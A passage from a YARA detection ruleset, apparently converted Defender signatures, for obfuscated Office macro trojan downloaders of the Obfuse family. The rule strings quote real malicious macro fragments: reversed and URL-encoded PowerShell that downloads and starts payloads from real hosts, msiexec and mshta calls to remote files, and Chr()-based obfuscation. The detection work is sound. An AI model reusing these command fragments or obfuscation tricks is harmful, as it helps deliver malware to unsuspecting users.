        $x_1_2 = {26 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-16] 2c 20 [0-16] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = "= New WshShell" ascii //weight: 1
        $x_1_4 = "ActiveDocument.AcceptAllRevisions" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IS_2147742206_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IS!MTB"
        threat_id = "2147742206"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"cmd /c mSie^x^EC \" & Chr(261 - 214) & Chr(414 - 309) & Chr(137 - 105) & Chr(456 - 352) & Chr(434 - 318) & Chr(358 - 242) & Chr(412 - 300) & Chr(283 - 225) &" ascii //weight: 1
        $x_1_2 = "= \"WSCRipt.sHELl\"" ascii //weight: 1
        $x_1_3 = ".Run" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IT_2147742215_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IT!MTB"
        threat_id = "2147742215"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {29 20 3d 20 43 68 72 28 41 73 63 28 4d 69 64 28 [0-53] 2c 20 [0-53] 2c 20 31 29 29 20 2d}  //weight: 1, accuracy: Low
        $x_1_2 = "Shell (" ascii //weight: 1
        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 [0-21] 2c 20 22 34 22 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 53 61 76 65 54 6f 46 69 6c 65 20 [0-53] 2c 20 32}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 77 72 69 74 65 20 [0-53] 2e 72 65 73 70 6f 6e 73 65 42 6f 64 79}  //weight: 1, accuracy: Low
        $x_1_6 = "= 1 To Len(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IU_2147742224_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IU!MTB"
        threat_id = "2147742224"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "VBA.Shell (Right(\"Insidepower\", 5) & \"she\" & String(2, \"l\") & \" ws\" & KaBu & \"ript \" & Kasza)" ascii //weight: 1
        $x_1_2 = "Kasza = \"/\" & \"\" & \"E:JS\" & Chr(Int3) & \"ripT \" & Chr(34) & Kasza & Chr(34)" ascii //weight: 1
        $x_1_3 = "& \"\\normal.txt:$.$\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IV_2147742247_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IV!MTB"
        threat_id = "2147742247"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ThisDocument.DefaultTargetFrame & \"on-stab.online/result/2754.jpg'" ascii //weight: 1
        $x_1_2 = "LDR_2754.js" ascii //weight: 1
        $x_1_3 = "= Environ(\"APPDATA\") & \"\\\"" ascii //weight: 1
        $x_1_4 = "ShlWai str65 & \"fold1\\\" & \"fileDown656593\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IW_2147742249_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IW!MTB"
        threat_id = "2147742249"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"xsl\"" ascii //weight: 1
        $x_1_2 = {43 61 6c 6c 20 [0-9] 28 [0-8] 28 22 74 65 6d 70 22 29 20 26 20 22 5c}  //weight: 1, accuracy: Low
        $x_1_3 = {26 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-16] 2c 20 [0-8] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-16] 29 20 53 74 65 70 20 32}  //weight: 1, accuracy: Low
        $x_1_5 = "ActiveDocument.AcceptAllRevisionsShown" ascii //weight: 1
        $x_1_6 = "ActiveDocument.Bookmarks" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IX_2147742252_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IX!MTB"
        threat_id = "2147742252"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "tly.com\", \"" ascii //weight: 1
        $x_1_2 = "= Shell(Kd1 + Kd2 + Kd3)" ascii //weight: 1
        $x_1_3 = {74 68 69 72 64 20 3d 20 28 74 68 69 72 64 20 2b 20 [0-9] 28 73 65 63 6f 6e 64 29 20 2b 20 66 6f 75 72 74 68 28 73 65 63 6f 6e 64 20 4d 6f 64 20 4c 65 6e 28 [0-9] 29 29 29 20 4d 6f 64 20 32 35 36}  //weight: 1, accuracy: Low
        $x_1_4 = {66 6f 75 72 74 68 28 73 65 63 6f 6e 64 29 20 3d 20 66 6f 75 72 74 68 28 73 65 63 6f 6e 64 29 20 58 6f 72 20 [0-9] 28 54 65 6d 70 20 2b 20 [0-9] 28 28 74 68 69 72 64 20 2b 20 [0-9] 28 74 68 69 72 64 29 29 20 4d 6f 64 20 32 35 34 29 29}  //weight: 1, accuracy: Low
        $x_1_5 = "(third) + 1) Mod 256" ascii //weight: 1
        $x_1_6 = {28 28 74 68 69 72 64 20 2b 20 [0-9] 28 74 68 69 72 64 29 29 20 4d 6f 64 20 32 35 34 29 29}  //weight: 1, accuracy: Low
        $x_1_7 = {44 69 6d 20 [0-9] 28 30 20 54 6f 20 32 35 35 29 20 41 73 20 49 6e 74 65 67 65 72 2c 20 73 65 63 6f 6e 64 20 41 73 20 49 6e 74 65 67 65 72 2c 20 74 68 69 72 64 20 41 73 20 4c 6f 6e 67 2c 20 66 6f 75 72 74 68 28 29 20 41 73 20 42 79 74 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IZ_2147742291_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IZ!MTB"
        threat_id = "2147742291"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"cmD /C mSiE^X^eC \" & Chr(174 - 127) & Chr(187 - 82) & Chr(325 - 293) & Chr(159 - 55) & Chr(441 - 325) & Chr(250 - 134) & Chr(299 - 187) & Chr(401 - 343) & Chr(238 - 191) &" ascii //weight: 1
        $x_1_2 = ".Run" ascii //weight: 1
        $x_1_3 = "= \"WSCRipt.sHELl\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JA_2147742293_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JA!MTB"
        threat_id = "2147742293"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CallByName CreateObject(\"wS\" & Chri & \"Ript.She\" & Ja), \"Run\", VbMethod, Right(Right(\"WhiteGunPower\", 8), Rule) & \"sHe\" & Ja & \" wS\" & Chri & \"RipT           \" & GroundOn, 0" ascii //weight: 1
        $x_1_2 = "& \"\\stati_stic.inf:com1\"" ascii //weight: 1
        $x_1_3 = "= \"\" & \"/\" & \"\" & \"e\" & \":jS\" & Chri & \"R\" & \"IpT \" & Chr(36 - Price) &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RB_2147742296_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RB"
        threat_id = "2147742296"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = "StrReverse(\":tamrof/ teg so\" & \" cimw\")" ascii //weight: 1
        $x_1_3 = {47 65 74 54 69 63 6b 43 6f 75 6e 74 20 2b 20 28 [0-9] 20 2a 20 31 30 30 30 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JB_2147742297_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JB!MTB"
        threat_id = "2147742297"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= MsgBox(\"Error:\" & vbCrLf & \"Content not available\")" ascii //weight: 1
        $x_1_2 = {2e 54 65 78 74 42 6f 78 [0-1] 2e 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = "= \"NewMacros1\"" ascii //weight: 1
        $x_1_4 = {3d 20 47 65 74 54 69 63 6b 43 6f 75 6e 74 20 2b 20 28 [0-18] 20 2a 20 31 30 30 30 29}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 4d 69 64 28 [0-9] 2c 20 31 2c}  //weight: 1, accuracy: Low
        $x_1_6 = {53 68 65 6c 6c [0-16] 20 26}  //weight: 1, accuracy: Low
        $x_1_7 = "Mod -" ascii //weight: 1
        $x_1_8 = "If Second(\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JC_2147742307_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JC!MTB"
        threat_id = "2147742307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://bananaarestsigiriya.com/ytpqaxwq/555555555.png" ascii //weight: 1
        $x_1_2 = "C:\\Fetil\\Giola\\oceanDh" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JC_2147742307_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JC!MTB"
        threat_id = "2147742307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"xsl\"" ascii //weight: 1
        $x_1_2 = "(\"temp\")" ascii //weight: 1
        $x_1_3 = {26 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-16] 2c 20 [0-8] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-16] 29 20 53 74 65 70 20 32}  //weight: 1, accuracy: Low
        $x_1_5 = "ActiveDocument.AcceptAllRevisionsShown" ascii //weight: 1
        $x_1_6 = "ActiveDocument.Bookmarks" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JE_2147742337_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JE!MTB"
        threat_id = "2147742337"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {4d 53 48 54 41 20 68 74 74 70 73 3a 2f 2f 67 6f 76 65 72 6e 6f 73 70 2e 63 6f 6d 2e 62 72 2f [0-10] 2e 68 74 61}  //weight: 2, accuracy: Low
        $x_1_2 = "Public Sub Auto_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JE_2147742337_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JE!MTB"
        threat_id = "2147742337"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ", Null, Null, Null" ascii //weight: 1
        $x_1_2 = {29 20 26 20 22 23 22 [0-2] 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-64] 29 20 53 74 65 70 20 32 [0-2] 4d 69 64 28}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 52 65 70 6c 61 63 65 28 [0-64] 2c 20 22 23 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JF_2147742340_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JF!MTB"
        threat_id = "2147742340"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "(Environ(\"TEMP\"))" ascii //weight: 1
        $x_1_2 = {43 61 6c 6c 20 [0-9] 28 [0-9] 2e [0-9] 2c 20 22 76 65 72 69 6e 73 74 65 72 65 2e 78 6c 73 22 2c 20 30 29}  //weight: 1, accuracy: Low
        $x_1_3 = "= VBA.Split(\"\")" ascii //weight: 1
        $x_1_4 = "= VBA.Mid$(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JF_2147742340_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JF!MTB"
        threat_id = "2147742340"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {36 38 37 34 37 34 37 30 37 33 22 29 20 26 20 [0-15] 28 22 33 61 32 66 32 66 36 62 37 32 36 35 36 35 32 65 36 64 36 39 36 33 37 32 36 66 37 34 36 31 36 62 36 34 36 39 37 32 36 35 36 33 37 34 32 65 36 33 36 66 36 64 32 66 36 37 37 32 36 35 37 39 36 64 36 66 36 39 37 32 32 66 [0-50] 32 65}  //weight: 2, accuracy: Low
        $x_1_2 = {43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-15] 2c 20 [0-15] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {47 65 74 4f 62 6a 65 63 74 28 [0-15] 28 22 37 37 36 39 36 65 36 64 36 37 36 64 37 34 37 33 33 61 35 63 22 29 20 26 20 [0-15] 28 22 35 63 32 65 35 63 37 32 36 66 36 66 37 34 35 63 36 33 36 39 36 64 37 36 33 32 22 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {36 37 37 32 36 35 37 39 36 64 22 29 20 26 20 [0-15] 28 22 36 66 37 32 36 35 32 65 36 35 37 38 36 35}  //weight: 1, accuracy: Low
        $x_1_5 = {47 65 74 4f 62 6a 65 63 74 28 [0-15] 28 22 37 37 36 39 36 65 36 64 36 37 36 64 37 34 37 33 33 61 35 63 35 63 32 65 35 63 37 32 36 66 36 66 37 34 35 63 36 33 36 39 36 64 37 36 33 32 33 61 35 37 22 29 20 26 20 [0-15] 28 22 36 39 36 65 33 33 33 32 35 66 35 30 37 32 36 66 36 33 36 35 37 33 37 33 22 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JF_2147742340_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JF!MTB"
        threat_id = "2147742340"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "URLDecode(\"%70%6f%77%65%72%73%68%65%6c%6c%20%2d%73%74%61%20%2d%6e%6f%70%20%2d%77%20%68%69%64%64%65%6e%20%2d%65%78%65%63%20%62%79%70%61%73%73%20%2e%20\")" ascii //weight: 1
        $x_1_2 = "%68%74%74%70%73%3a%2f%2f%63%64%6e%2e%61%6c%75%6d%6e%69%6e%65%74%77%6f%72%6b%2e%73%69%74%65%2f%37%33%35%66%34%64%37%35%65%63%65%61%66%66%30%34%61%39%61%66%30%31%62%66%66%31%37%38%35%36%39%34%2f%73%75%72%76%65%79%2e%67%61%74%68%65%72" ascii //weight: 1
        $x_1_3 = "%43%3a%5c%77%69%6e%64%6f%77%73%5c%74%65%6d%70%5c%73%75%72%76%65%79%2e%70%73%31" ascii //weight: 1
        $x_1_4 = {4d 69 64 28 53 74 72 69 6e 67 54 6f 44 65 63 6f 64 65 2c 20 [0-10] 20 2b 20 31 2c 20 32 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JG_2147742342_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JG!MTB"
        threat_id = "2147742342"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {68 74 74 70 3a 2f 2f 77 6e 72 66 61 39 79 2e 63 6f 6d 2f 69 7a 35 2f [0-10] 2e 70 68 70 3f 6c 3d [0-10] 2e 63 61 62 22 2c 20 22 [0-10] 2e 65 78 70 22 2c 20 30 2c 20 30 29}  //weight: 1, accuracy: Low
        $x_1_2 = {72 65 67 73 76 72 33 32 20 [0-10] 2e 65 78 70 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JG_2147742342_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JG!MTB"
        threat_id = "2147742342"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= utm1 + utm2 + utm3" ascii //weight: 1
        $x_1_2 = "Shell (utm)" ascii //weight: 1
        $x_1_3 = {74 68 69 72 64 20 3d 20 28 74 68 69 72 64 20 2b 20 [0-9] 28 73 65 63 6f 6e 64 29 20 2b 20 66 6f 75 72 74 68 28 73 65 63 6f 6e 64 20 4d 6f 64 20 4c 65 6e 28 [0-9] 29 29 29 20 4d 6f 64 20 32 35 36}  //weight: 1, accuracy: Low
        $x_1_4 = {66 6f 75 72 74 68 28 73 65 63 6f 6e 64 29 20 3d 20 66 6f 75 72 74 68 28 73 65 63 6f 6e 64 29 20 58 6f 72 20 [0-9] 28 54 65 6d 70 20 2b 20 [0-9] 28 28 74 68 69 72 64 20 2b 20 [0-9] 28 74 68 69 72 64 29 29 20 4d 6f 64 20 32 35 34 29 29}  //weight: 1, accuracy: Low
        $x_1_5 = {44 69 6d 20 [0-9] 28 30 20 54 6f 20 32 35 35 29 20 41 73 20 49 6e 74 65 67 65 72 2c 20 73 65 63 6f 6e 64 20 41 73 20 49 6e 74 65 67 65 72 2c 20 74 68 69 72 64 20 41 73 20 4c 6f 6e 67 2c 20 66 6f 75 72 74 68 28 29 20 41 73 20 42 79 74 65}  //weight: 1, accuracy: Low
        $x_1_6 = {74 68 69 72 64 20 3d 20 28 74 68 69 72 64 20 2b 20 [0-9] 28 74 68 69 72 64 29 20 2b 20 31 29 20 4d 6f 64 20 32 35 36}  //weight: 1, accuracy: Low
        $x_1_7 = "= StrConv(fourth, vbUnicode)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JH_2147742380_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JH!MTB"
        threat_id = "2147742380"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://ow.ly/QoHbJ" ascii //weight: 1
        $x_1_2 = "C:\\Windows\\Temp\\AdobeReader.bat" ascii //weight: 1
        $x_1_3 = "Shell(strSaveTo, vbNormalFocus)" ascii //weight: 1
        $x_1_4 = "objFSO.DeleteFile (strSaveTo)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JH_2147742380_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JH!MTB"
        threat_id = "2147742380"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e [0-9] 2e 43 61 70 74 69 6f 6e 29 2e 43 72 65 61 74 65 28 [0-9] 20 2b 20 [0-9] 2c 20 [0-9] 2c 20 [0-9] 2c 20 [0-9] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2b 20 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e [0-9] 2e 43 61 70 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_3 = "ShowWindow! _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JH_2147742380_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JH!MTB"
        threat_id = "2147742380"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "StrReverse(\"oP\") + StrReverse(\"Srew\") + StrReverse(\"- lleh\") + StrReverse(\"xE\")" ascii //weight: 1
        $x_1_2 = "StrReverse(\"'sbv.tneilC\\%ATADPPA%' ssecorP-tratS;)'sbv.tneilC\\%ATADPPA%','gpj.14bili4461_p/oi.pot4pot.h//:sptth'(eliFdaolnwoD.)tneilCbeW.teN.met\")" ascii //weight: 1
        $x_1_3 = "Shell Environ$(StrReverse(\"CEPSMOC\")) & StrReverse(\" c/ \") & PShellCode, vbHide" ascii //weight: 1
        $x_1_4 = "StrReverse(\"'sbv.tneilC\\%cilbup%' ssecorP-tratS;)'sbv.tneilC\\%cilbup%','gpj.20qs1x4461_p/oi.pot4pot.i//:sptth'(eliFdaolnwoD.)tneilCbeW.teN.met\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JI_2147742386_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JI!MTB"
        threat_id = "2147742386"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "(Environ(\"TEMP\"))" ascii //weight: 1
        $x_1_2 = {43 61 6c 6c 20 [0-9] 28 [0-9] 2e [0-9] 2c 20 22 76 65 72 69 6e 73 74 65 72 65 2e 78 6c 73 22 2c 20 30 29}  //weight: 1, accuracy: Low
        $x_1_3 = {53 70 6c 69 74 28 [0-9] 2c 20 76 62 4e 65 77 4c 69 6e 65 29}  //weight: 1, accuracy: Low
        $x_1_4 = ".Document.body.innerText" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JJ_2147742388_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JJ!MTB"
        threat_id = "2147742388"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".js\"" ascii //weight: 1
        $x_1_2 = "= Environ(\"windir\") + \"\\Temp\"" ascii //weight: 1
